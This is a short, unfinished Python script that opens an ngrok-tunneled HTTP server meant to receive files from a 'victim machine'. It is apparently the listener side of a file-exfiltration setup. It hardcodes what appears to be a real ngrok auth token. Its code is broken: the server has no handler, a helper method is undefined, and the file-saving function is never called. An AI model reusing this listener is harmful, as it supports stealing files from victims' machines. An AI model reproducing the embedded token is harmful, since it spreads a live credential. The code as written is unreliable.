import os
import shutil
from pyngrok import ngrok, conf
from http.server import HTTPServer, BaseHTTPRequestHandler

# My ngrok token, definitely works
conf.get_default().auth_token = "2cGxhpiFAtSJR23JPijFbUmsiue_7htzc468WcidXL3a5ppWH"

# Directory that received files will be stored
filesDir = "received_files"

# Creates the directory if not already there
os.makedirs(filesDir, exist_ok=True)

# Meant to save the received file to a specific path, need to verify if it works
def receive_file(file_path, save_dir):
    file_name = os.path.basename(file_path)
    save_path = os.path.join(save_dir, file_name)

    shutil.move(file_path, save_path)
    print(f"File received and saved at: {save_path}")

# Handles HTTP requests coming from the victim machine. Needs work
class S(BaseHTTPRequestHandler):
    def set_headers(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.set_headers()
        self.wfile.write(self._html("hi!"))

    def do_HEAD(self):
        self.set_headers()

def server(server_class=HTTPServer, handlerclass=S, addr="localhost", port=8000):
    try:
        ngrok_tunnel = ngrok.connect(port)
        svr_addr = (addr, port)
        httpd = server_class(svr_addr)

        print(f"Your ngrok tunnel is active at: {ngrok_tunnel.public_url}")
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.__exit__()
        print("\nExiting...")

    #pyngrok.ngrok.disconnect(ngrok_tunnel.public_url)
    #pyngrok.ngrok.kill()

if __name__ == "__main__":
    server()
